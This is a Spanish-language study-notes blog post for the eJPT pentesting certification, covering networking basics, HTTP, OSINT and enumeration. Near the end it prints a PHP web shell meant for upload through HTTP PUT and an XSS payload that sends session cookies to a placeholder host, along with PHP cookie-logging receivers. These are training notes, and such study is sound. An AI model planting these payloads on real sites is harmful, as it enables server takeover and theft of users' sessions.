---
layout: single
title: eJPT Preparation
excerpt: "Bases para la certificacion eJPT"
date: 2022-03-19
classes: wide
header:
  teaser: # /assets/images/hospital-dicom/dicom.png
  teaser_home_page: true
categories:
  - Research
tags:
  - eJPT
  - Certificacion
  - eLearnSecurity
---

# Conceptos basicos de redes

## Conceptos de criptografia y VPN

Los protocolos de criptografia encriptan la informacion transmitida para proteger la comunicacion, un gran protocolo de es el *VPN* (Vitual Private Network).
El VPN usa criptografia para extender una red privada sobre una publica, como internet. 

Cuado uno esta conectado por vpn actualmente esta corriendo los mismos protocolos de una red privada, esto le permite realizar operaciones de red de bajo nivel los cuales puedes interceptar con **Wireshark**

### -Introduccion a Wireshark 

Wireshark es una herramienta rastreadora(sniffer) de red, un sniffer te permite ver los datos transmitidos a través de la red hacia y desde su computadora.

```
Nota: En el laboratorio para identificar el tipo de protocolo de la pagina local 
usamos Wireshark pero antes de elegir la interfaz de coneccion debemos ver de donde 
vienen las conexiones, tambien mirar siempre que hosts tiene en el archivo '/etc/hosts'.
```

### -Aritmetica Binaria Basica

Convertir numeros de sistema decimal a sistema binario es algo sencillo, tambien se puede hacer con operadores logicos como: 

-"NOT" Este operador se encarga de cambiar los **0** por **1** y viceversa

-"AND" Este operador se encarga de comparar un bit con el otro dependiendo de su orden y lo cambia si no cumple la condicion

-"OR"  Este operador se encarga de comparar un bit con el otro dependiendo de su orden, si no cumple la condicion se cambia

-"XOR" Este operador hace alusion al 'OR exclusivo' 

Tener en cuenta que la base hexadecimal tambien es usada en la informatica asi que es bueno saber como funciona

## Protocolos

### -Paquetes

Cada paquete en todo protocolo tiene la siguiente estructura:

-"Header" El encabezado tiene una estructura especifica del protocolo: Esto garantiza que el host receptor pueda interpretar correctamente el payload y manejar la comunicacion general.

-"Payload" Es la informacion actualmente

## ISO/OSI

OSI/ISO consiste en 7 capas y su uso como referencia para la implementacion de la actual capa de protocolos.

![](/assets/images/OSI.jpg)

## Protocolos de internet

### -IP/Mask

Para identificar completamente un Host, tambien necesita conocer su red. Con una IP/netmask de red, puede identificar la 
parte de la red y la parte del host de una direccion IP. Haces la operacion "AND" entre la direccion IP y la SubNetMask obviamente ambos convertidos en binario, esto funciona par IPv4

![](/assets/images/IP.jpg)

## Enrutamiento

Hay dispositivos de redes llamados 'routers', su proposito es aprender rutas por las cuales alcanzar otras redes y asi poder
transferir paquetes de datos entre ellos, ese proceso se le llama 'enrutamiento'; Para poder saber que ruta mas corta puede tomar el router utilizamos teoria de nodos.
Para conocer el enrutamiento en nuestra red puedes ejecutar el siguiente commando:

```bash
ip route
```

***Para poder agregar rutas estaticas usamos el siguiente comando:***

```
ip route add IP/24 dev "interfaz" 
ip route add IP/24 via "IP"
```

## Link Layer Devices and Protocols 

### -Direcciones MAC

Las direcciones IP son la tercera capa (Network Layer) esquema de direccionamiento usado para identificar un host en una red
mientras que las direcciones MAC solo identifican la tarjeta de red, para saber tu direccion MAC se necesita el siguiente 
comando:


```bash 
ip addr

```

Para que una maquina A envie un paquete a una maquina B a través de un router esta debe especificar la direccion IP de la 
maquina B pero la direccion MAC del router, este se encargara de cambiarle la direccion MAC para que llegue a B.

### -ARP
Cuando un host quiere enviar paquetes a otro host este necesita conocer la direccion IP y direccion MAC de destino para poder
construir el paquete.
Por ejemplo en las oficinas para enviar un paquete de A a B, la maquina A se encarga de construir un paquete de **peticion 
ARP** que contiene la IP de B pero la direccion ip FF:FF:FF:FF:FF:FF y con ayuda de los switches se envia a todas las
maquinas preguntando si su IP es la que esta en el archivo hasta encontrarla.

Para poder ver el ARP cache de tu host lo puedes hacer con el siguiente comando:

```bash
ip neighbour

```

## TPC/UDP

Ambos son protocolos mas comunes de transporte usados en internet, TCP te garantiza la entrega de paquetes y es estable 
antes de transeferir informacion.
En cuanto a UDP no garantiza la entrega de paquetes, no olvidar que existen otro tipo de protocolos como SCTP que es 
orientado a las conexiones pero proporciona la transferencia de datos orientado a mensajes.

### -Puertos

Los puertos son usados para un solo proceso de conexion, en estos corren 'demonios' el cual es un programa que corre un 
servicio como los de la siguiente imagen:

![](/assets/images/Ports.jpg)

Para saber que puertos estan abiertos y que programas estan corriendo en tu maquina puedes ejecutar el siguiente comando:

```bash
netstat -tunp

netstat -p tcp -p udp
```

***No olvidar que existen 65536 puertos***

## Firewall y Defensa de red

La caracteristica mas basica de un firewall es el filtrado de paquetes, con un filtrado de paquetes el administrador puede 
crear reglas con caracteristicas como la fuente de la IP, protocolo, puerto de destino, etc.

## DNS 

Es el proceso que convierte un nombre de servidor en una direccion IP compatible con el ordenador 

# Aplicaciones web

## HTTP 

Informacion especifica en [HTTP](https://developer.mozilla.org/es/docs/Web/HTTP/Overview)

Para poder interceptar la informacion de una pagina http lo podemos hacer con netcat de la siguiente manera:

```bash
nc -v {Host} 80

GET / HTTP/1.1 
Host: {Host}
```

Pero para conecciones HTTPS podemos interceptarlo con ***openssl*** por el puerto 443

```bash
openssl s_client -connect {Host}:443
```

![](/assets/images/HTTP.jpeg)

## Cookies and Sessions

Para los conceptos de Cookies y Sesiones tenemos toda la informacion en el siguiente link [Cookies and Sessions](https://programacionymas.com/blog/cookies-y-sesiones)

# Recopilacion de informacion

## Open Source Intelligence

Para poder recopilar informacion de una empresa o de una persona podemos realizarlo a travez de redes sociales y tambien de paginas del gobierno encargadas
de guardar toda nuestra informacion.

## Enumeracion de subdominios pasivo

Para realizar varias consultas de subdominios existen varios recursos como:


[dns.dumpster.com](https://dnsdumpster.com/)

[Sublist3r](https://github.com/aboul3la/Sublist3r)

Pero recordemos que con wfuzz tambien podemos hacer el mismo reconocimiento de subdominios con un buen 'wordlists' como el de [SecLists](https://github.com/danielmiessler/SecLists.git) y ejecutando el siguiente comando:

```bash
wfuzz -H 'HOST:FUZZ.IP' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

## Nmap

Para el uso de nmap podemos ver walkthrough de maquinas en HTB u otras platadormas, tambien existen otros escaners de puertos parecidos a Nmap como:

[masscan](https://github.com/robertdavidgraham/masscan.git)

## HTTP Verbs

Existen varios tipos de HTTP Verbs como: **GET, POST, HEAD, PUT, DELETE**.
En el metodo PUT podemos explotarlo subiendo un archivo .php malicioso con el siguiente codigo.

```php
<?php
if (issets($_GET['cmd']))
{
        $cmd = $_GET['cmd'];
        echo '<pre>';
        $result = shell_exec($cmd);
        echo $result;
        echo '</pre>';
}
?>
```

Este nos permite enviar una query via GET que nos interpreta como una shell.

## Enumeracion de directorios

Existen varias tecnicas de enumeracion de directorios que ya estan explicadas en otra seccion de mi pagina web

## Google Hacking

Al momento de realizar busquedas en google existen algunos caracterecs basicos que nos ayudan a especificar lo que queremos encontrar.

![](/assets/images/Google.jpeg)

## Cross Site Scripting 

Para saber si una pagina es vulnerables una de las formas mas conocidas para identificarlo es ingresando etiquetas o ingresando scripts.

```javascript
<script>alert(document.cookie)</script>
```
Con esto saldra nuestra cookie de sesion en una ventana de alerta, para poder recibir cookies importantes podemos optar por mandarnos la cookie a traves de un script.

```javascript
<script>
var i = new Image();
i.src="IP/DOMINIO"+document.cookie;
</script>
```

Mientras en el lado del servidor configuramos un archivo php para poder recibir la informacion.

```php
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp)
?>
```

```php
<?php

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$fp = fopen('log.txt'. 'a');

fwrite($fp, $ip.' '.$browser." \n");
fwrite($fp, urlencode($_SERVER['QUERY_STRING']). " \n\n");
fclose($fp);

>
```
